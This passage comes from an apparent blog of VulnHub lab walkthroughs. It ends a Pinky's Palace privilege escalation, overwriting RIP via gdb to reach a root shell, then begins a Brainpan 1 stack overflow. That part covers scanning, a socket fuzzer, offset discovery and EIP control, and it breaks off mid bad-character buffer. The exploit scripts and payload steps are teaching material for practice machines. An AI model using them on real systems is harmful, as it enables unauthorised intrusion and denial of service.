<p>In the output we can see a spawn function, this one catches my attention, I added a breakpoint in the main function, ran it, and jumped to the spawn function and a dash shell was executed, but we aren’t root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>main
Breakpoint 1 at 0x817
<span class="o">(</span>gdb<span class="o">)</span> run
Starting program: /home/pinky/adminhelper 

Breakpoint 1, 0x0000555555554817 <span class="k">in </span>main <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span> jump spawn
Continuing at 0x5555555547d4.
process 2365 is executing new program: /bin/dash
Error <span class="k">in </span>re-setting breakpoint 1: Function <span class="s2">"main"</span> not defined.
<span class="nv">$ </span><span class="nb">whoami
</span>pinky
</code></pre></div></div>

<p>To escalate to root, we need to run our malicious instructions outside of gdb, so I run the binary with 500 characters to provoke a crash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*500)'</span><span class="si">)</span>  
Starting program: /home/pinky/adminhelper <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*500)'</span><span class="si">)</span>
                                                           
Program received signal SIGSEGV, Segmentation fault.      
next_env_entry <span class="o">(</span><span class="nv">position</span><span class="o">=</span>&lt;optimized out&gt;<span class="o">)</span> at arena.c:220     
220     arena.c: No such file or directory.
</code></pre></div></div>

<p>Then, I could find the offset in 72 bytes and overwrite the rip instruction with 6 B’s (42 in hexadecimal).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*72 + "B"*6)'</span><span class="si">)</span>
The program being debugged has been started already.
Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
Starting program: /home/pinky/adminhelper <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*72 + "B"*6)'</span><span class="si">)</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<p>As we can verify, the rip instruction was controlled.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info registers <span class="nv">$rip</span>
rip            0x424242424242   0x424242424242
</code></pre></div></div>

<p>Is time to disassemble the spawn function to locate its address.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disas spawn
Dump of assembler code <span class="k">for function </span>spawn:
   0x00005555555547d0 &lt;+0&gt;:     push   %rbp
   0x00005555555547d1 &lt;+1&gt;:     mov    %rsp,%rbp
   0x00005555555547d4 &lt;+4&gt;:     sub    <span class="nv">$0x10</span>,%rsp
   0x00005555555547d8 &lt;+8&gt;:     movl   <span class="nv">$0x0</span>,-0x4<span class="o">(</span>%rbp<span class="o">)</span>
   0x00005555555547df &lt;+15&gt;:    movl   <span class="nv">$0x0</span>,-0x8<span class="o">(</span>%rbp<span class="o">)</span>
   0x00005555555547e6 &lt;+22&gt;:    mov    <span class="nt">-0x4</span><span class="o">(</span>%rbp<span class="o">)</span>,%eax
   0x00005555555547e9 &lt;+25&gt;:    mov    %eax,%edi
   0x00005555555547eb &lt;+27&gt;:    callq  0x555555554680 &lt;seteuid@plt&gt;
   0x00005555555547f0 &lt;+32&gt;:    mov    <span class="nt">-0x8</span><span class="o">(</span>%rbp<span class="o">)</span>,%eax
   0x00005555555547f3 &lt;+35&gt;:    mov    %eax,%edi
   0x00005555555547f5 &lt;+37&gt;:    callq  0x555555554670 &lt;setegid@plt&gt;
   0x00005555555547fa &lt;+42&gt;:    mov    <span class="nv">$0x0</span>,%edx
   0x00005555555547ff &lt;+47&gt;:    mov    <span class="nv">$0x0</span>,%esi
   0x0000555555554804 &lt;+52&gt;:    lea    0xd9<span class="o">(</span>%rip<span class="o">)</span>,%rdi        <span class="c"># 0x5555555548e4</span>
   0x000055555555480b &lt;+59&gt;:    callq  0x555555554660 &lt;execve@plt&gt;
   0x0000555555554810 &lt;+64&gt;:    nop
   0x0000555555554811 &lt;+65&gt;:    leaveq 
   0x0000555555554812 &lt;+66&gt;:    retq   
End of assembler dump.
</code></pre></div></div>

<p>The address to add in the rip register is <strong>0x00005555555547d0</strong>, so I built the final instruction, assigning first with 71 A’s, and the jump address to the spawn function in little endian.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@pinkys-palace:~<span class="nv">$ </span>/home/pinky/adminhelper <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*72 + "\xd0\x47\x55\x55\x55\x55")'</span><span class="si">)</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGUUUU
<span class="c"># whoami</span>
root
<span class="c"># python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'</span>
root@pinkys-palace:/home/pinky# <span class="nb">cd</span> /root
root@pinkys-palace:/root# <span class="nb">ls
</span>root.txt
root@pinkys-palace:/root# <span class="nb">cat </span>root.txt 
<span class="o">===========[!!!</span>CONGRATS!!!]<span class="o">===========</span>

<span class="o">[</span>+] You r00ted Pinky<span class="s1">'s Palace Intermediate!
[+] I hope you enjoyed this box!
[+] Cheers to VulnHub!
[+] Twitter: @Pink_P4nther

Flag: 99975cfc5e2eb4c199d38d4a2b2c03ce
</span></code></pre></div></div>


  
    <h1 class="post-title">VulnHub - Brainpan 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>October 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> it is an interesting box and a great start point for those who are beginning to learn binary exploitation.</p>

<p><strong>Author:</strong> superkojiman</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>I performed an ARP scan to discover the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24 
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.159 00:0c:29:76:be:a5       VMware, Inc.
192.168.179.254 00:50:56:f6:66:ae       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>The full TCP port scan revealed two open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p-</span> 192.168.179.159 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Then I performed the service enumeration of open ports, OS detection, script scanning and traceroute agains the target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p9999</span>,10000 192.168.179.159 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings:
|   NULL:
|     _| _|
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     <span class="o">[</span>________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 <span class="o">(</span>Python 2.7.3<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=10/31%Time=617EACA4%P=x86_64-pc-linux-gnu%r(N
SF:ULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");
</span></code></pre></div></div>

<h3 id="enumeration-on-port-10000">Enumeration on port 10000</h3>

<p>The web service running on this port doesn’t reveal much, so I decided run gobuster to discover hidden web content.</p>

<p><img src="/assets/images/brainpan/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.159:10000/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span>
...
http://192.168.179.159:10000/bin                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /bin/]
</code></pre></div></div>

<p>The bin directory was discovered, so I access it and found a windows executable file.</p>

<p><img src="/assets/images/brainpan/screenshot-2.png" alt="" /></p>

<p>I downloaded the exe file to the attacking machine, examining it with the strings tool I found a possible password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.179.159:10000/bin/brainpan.exe

root@kali:~<span class="nv">$ </span>file brainpan.exe 
brainpan.exe: PE32 executable <span class="o">(</span>console<span class="o">)</span> Intel 80386 <span class="o">(</span>stripped to external PDB<span class="o">)</span>, <span class="k">for </span>MS Windows

root@kali:~<span class="nv">$ </span>strings brainpan.exe | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'19p'</span>
shitstorm
</code></pre></div></div>

<p>I ran the executable file on a windows machine, this is waiting for incoming connections on port 9999.</p>

<p><img src="/assets/images/brainpan/screenshot-3.png" alt="" /></p>

<p>I connected on that service, entered the password and was greeted with an access granted but nothing else.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc 192.168.38.131 9999    
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

<span class="o">[</span>________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          <span class="o">&gt;&gt;</span> shitstorm
                          ACCESS GRANTED
</code></pre></div></div>

<p>On the windows machine we can see that the exe file that is running copied the password that I entered and shows its length, this executable is the same one that runs on port 9999 on the target machine.</p>

<p><img src="/assets/images/brainpan/screenshot-4.png" alt="" /></p>

<h3 id="debugging-the-excutable-file">Debugging the excutable file</h3>

<p>On my test windows machine I will use Immunity Debugger, to start debugging we need to attach our executable file, to this we click on <strong>File-&gt;Open</strong> and select the brainpan.exe application, then we click on the play button, this prcess most be carried out every time a crash occurs.</p>

<p><img src="/assets/images/brainpan/screenshot-5.png" alt="" /></p>

<p>I developed a python script that will send 100 ‘A’ characters first, then increase to 200 characters and so on, this is done in order to cause a crash in the application.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>

import socket
import <span class="nb">time
</span>import sys

<span class="nv">host</span><span class="o">=</span><span class="s2">"192.168.38.131"</span>
<span class="nv">port</span><span class="o">=</span>9999

<span class="nv">buffer</span><span class="o">=</span><span class="s2">"A"</span><span class="k">*</span>100

<span class="k">while </span>True:
    try:
        <span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span>
        s.settimeout<span class="o">(</span>10<span class="o">)</span>
        s.connect<span class="o">((</span>host,port<span class="o">))</span>
        s.send<span class="o">(</span>f<span class="s2">"{buffer} </span><span class="se">\n\r</span><span class="s2">"</span>.encode<span class="o">(</span><span class="s2">"latin-1"</span><span class="o">))</span>
        s.recv<span class="o">(</span>1024<span class="o">)</span>
        print<span class="o">(</span>f<span class="s2">"Sending {len(buffer)} bytes"</span><span class="o">)</span>
        time.sleep<span class="o">(</span>1<span class="o">)</span>
        <span class="nv">buffer</span><span class="o">=</span>buffer+<span class="o">(</span><span class="s2">"A"</span><span class="k">*</span>200<span class="o">)</span>
    except:
        print<span class="o">(</span>f<span class="s2">"Crash occurred at {len(buffer)-200} bytes"</span><span class="o">)</span>
        sys.exit<span class="o">(</span>0<span class="o">)</span>
</code></pre></div></div>

<p>Running the script we see that the connection stopped at 700 bytes, this means that an application failure occurred.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzzer.py 
Sending 100 bytes
Sending 300 bytes
Sending 500 bytes
Sending 700 bytes
Crash occurred at 700 bytes
</code></pre></div></div>

<p>As we can see in the following screenshot the EIP register was overwritten with our buffer of A’s (the hex equivalent of the letter A is \x41).</p>

<p><img src="/assets/images/brainpan/screenshot-6.png" alt="" /></p>

<h3 id="replicating-the-crash">Replicating the crash</h3>

<p>Now we know that the crash was triggered about 700 characters, we can replicate it without running the fuzzer again.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">host</span><span class="o">=</span><span class="s">"192.168.38.131"</span>
<span class="n">port</span><span class="o">=</span><span class="mi">9999</span>

<span class="nb">buffer</span><span class="o">=</span><span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="mi">700</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Sending buffer.."</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="nb">buffer</span><span class="si">}</span><span class="s"> </span><span class="se">\n\r</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"latin-1"</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done."</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Couldn't connect with the server"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="finding-the-offset-to-the-eip-register">Finding the offset to the EIP Register</h3>

<p>To locate the offset to the EIP register, we can use the ruby utility msf-pattern_create, this tool will create a unique string that will allow us to easily identify the four bytes of the EIP register, in this case we need to generate a 700 bytes buffer.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msf-pattern_create <span class="nt">-l</span> 700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A
</code></pre></div></div>

<p>We replace the A’s with the previously created string, and run the script.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">host</span><span class="o">=</span><span class="s">"192.168.38.131"</span>
<span class="n">port</span><span class="o">=</span><span class="mi">9999</span>

<span class="nb">buffer</span><span class="o">=</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Sending buffer.."</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="nb">buffer</span><span class="si">}</span><span class="s"> </span><span class="se">\n\r</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"latin-1"</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done."</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Couldn't connect with the server"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 poc2.py
Sending buffer..
Done.
</code></pre></div></div>

<p>As we can see, the EIP resister was overwritten with the string <strong>35724134</strong>.</p>

<p><img src="/assets/images/brainpan/screenshot-7.png" alt="" /></p>

<p>Then with the help of msf-pattern_offset we locate the offset to the EIP register.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 700 <span class="nt">-q</span> 35724134
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 524
</code></pre></div></div>
<h3 id="controlling-the-eip-register">Controlling the EIP Register</h3>

<p>Now, we include in the buffer variable 524 A’s then 4 B’s and 500 C’s.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">host</span><span class="o">=</span><span class="s">"192.168.38.131"</span>
<span class="n">port</span><span class="o">=</span><span class="mi">9999</span>

<span class="nb">buffer</span><span class="o">=</span><span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="mi">524</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x43</span><span class="s">"</span><span class="o">*</span><span class="mi">500</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Sending buffer.."</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="nb">buffer</span><span class="si">}</span><span class="s"> </span><span class="se">\n\r</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"latin-1"</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done."</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Couldn't connect with the server"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the script, and in the screenshot we can see that the EIP register was successfully overwritten with B’s (its equivalent in hexadecimal is \x42), if we notice then I added 500 C’s to test if there is the necessary size for the shellcode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 poc3.py
Sending buffer..
Done.
</code></pre></div></div>

<p><img src="/assets/images/brainpan/screenshot-8.png" alt="" /></p>

<h3 id="checking-for-bad-characters">Checking for bad characters</h3>

<p>Now we have control of the EIP register, it is time to check for bad characters, this procedure is important so that our shellcode can execute correctly, you can find the badchars list <a href="https://github.com/mrinalpande/scripts/blob/master/python/badchars">here</a>.</p>

<p>A common bad character known as null byte (\x00) was skipped in the buffer of badchars, this is wrong because it is used to terminate a string and could truncate the execution of the shellcode.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">host</span><span class="o">=</span><span class="s">"192.168.38.131"</span>
<span class="n">port</span><span class="o">=</span><span class="mi">9999</span>

<span class="n">badchars</span><span class="o">=</span><span class="p">(</span>
        <span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">"</span>
